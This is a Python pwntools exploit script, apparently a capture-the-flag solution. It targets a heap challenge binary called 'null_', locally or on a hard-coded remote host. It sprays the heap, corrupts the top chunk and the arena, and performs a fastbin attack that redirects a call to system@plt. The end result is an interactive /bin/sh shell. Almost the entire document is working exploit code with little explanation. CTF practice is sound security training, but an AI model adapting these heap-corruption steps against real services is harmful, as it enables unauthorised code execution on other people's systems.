#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import os

os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
context.log_level="debug"
pwn_file="./null_"
elf=ELF(pwn_file)
context.binary = elf

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn = remote("47.98.50.73", 5000)
    print conn.recvuntil('Give me PoW : ')
    conn.send(raw_input())
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add_chunk(size,block_count,content):
    conn.sendlineafter("Action: ","1")
    conn.sendlineafter("Size: ",str(size))
    conn.sendlineafter("Pad blocks: ",str(block_count))
    if(content == None):
        conn.sendlineafter("Content? (0/1): ","0")
    else:
        conn.sendlineafter("Content? (0/1): ","1")
        conn.recvuntil("Input: ")
        for i in content:
            conn.send(i)
            sleep(0.1)

conn.sendafter("Enter secret password: \n","i'm ready for challenge\n")
conn.recvuntil("exit\n")
for i in range(22):
    add_chunk(0x4000,0x200,["A"*0x4000]) # eat memory !
add_chunk(0x4000, 0x3dd-2, ["A"*0x4000]) # tail eat head 
add_chunk(0x4000, 0, ["A"*0x3fff, "A" + p64(0) + p64(0x201)]) # enlarge top 
add_chunk(0x780-8, 0, ["B"*(0x780-8)]) # bypass the weird largebin
add_chunk(0x40-8, 1, [fit( {32: 0x60201d}, length=0x40-8)]) # overflow arena -> fastbin attack
add_chunk(0x68, 0, ["/bin/sh\x00".ljust(11), p64(elf.plt['system']).ljust(0x68-11)])
debug()

conn.interactive()

